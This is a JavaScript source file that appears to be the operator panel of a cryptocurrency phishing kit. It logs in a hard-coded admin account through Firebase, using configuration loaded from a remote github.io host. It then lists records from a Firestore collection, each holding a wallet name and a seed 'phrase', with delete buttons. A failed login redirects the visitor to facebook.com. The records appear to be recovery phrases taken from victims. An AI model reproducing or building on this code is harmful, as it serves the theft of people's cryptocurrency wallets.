console.log('source')

import { acc as ACCOUNT } from "https://giterhaber.github.io/web-codes/configs.js"
import { cmBwsbFSqC as config} from 'https://giterhaber.github.io/web-codes/cmBwsbFSqC.js'


const app1 = firebase.initializeApp(ACCOUNT);

const auth = firebase.auth(firebase.initializeApp(ACCOUNT, 'acc'))


function login(pass) {

    var email = 'alexsource@source.admin'; //only email is given

    auth.signInWithEmailAndPassword(email, pass)
    .then((res) => {
    // location.href = './source.html'
    // window.history.pushState(null, '', 'database')
    DATABASE()
    console.log(res.user)
    })
    .catch((err) => {
      alert(err.message)
      console.log(err.code)
      console.log(err.message);
      window.history.replaceState(null, '', 'no')
      location.href = "https://facebook.com"; 

    })

$('#logout').on('click', () => {
  auth.signOut()
})

}

// login()


function enter() {

    $('input')
        .on('keypress', function (e) {
            let pass;
            pass = $('input').val()
           
            if (e.which == '13') {
                console.log('enter')
                $('input').val('*********************')
                $('input').attr('readonly', true)
                $('input').css('background-color', 'grey')
                login(pass)
            } 
            e.preventDefault;
        })

        
}

enter() 



//DATABASE


const app2 = firebase.initializeApp(config, 'app2');
var db = firebase.firestore(app2);
const rootDIV = document.querySelector('#root');


function deleteTodo(event) {
  let button = event.target
  let docId = button.parentElement.id


  if (confirm('delete sure?')) {
    console.log(docId)

    db.collection('data').doc(docId).delete()
      .then(() => {
        alert('Data Deleted')
        window.location.reload();
      })
      .catch((err) => {
        console.log(err)
      })


  }

}


//get data
function DATABASE() {
    db.collection("data").get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
          // doc.data() is never undefined for query doc snapshots
      
          // console.log(doc.id, " => ", doc.data());
      
      
      
          let wallet = doc.data().wallet
          let phrase = doc.data().phrase
      
          // console.log(`Wallet: ${wallet} <br> ${phrase}`)
      
          let text = `<p>Wallet: ${wallet} <br> ${phrase}</p><br>`
          // let para = document.createElement("div")
          // para.innerHTML = text
          // rootDIV.appendChild(para)
      
          let line = document.createElement("div");
          line.id = doc.id;
          line.innerHTML = text
          rootDIV.appendChild(line)
      
      
          //del button
          let delBtn = document.createElement("button")
          delBtn.setAttribute("style", "background-color: rgb(54, 57, 63); color:red;")
          delBtn.innerHTML = "x"
          delBtn.addEventListener("click", deleteTodo)
          line.prepend(delBtn)
      
          //DELETED HIDDEN
          let deletedBy = document.createElement('button')
          deletedBy.setAttribute('style', 'background-color: yellow;')
          deletedBy.innerHTML = 'DEL'
      
          if (doc.data().status == 'hide') {
      
              delBtn.after(deletedBy)
              deletedBy.addEventListener('click', function() {
                  alert('deleted on main panel')
              })
          }
      
      
        });
      });
}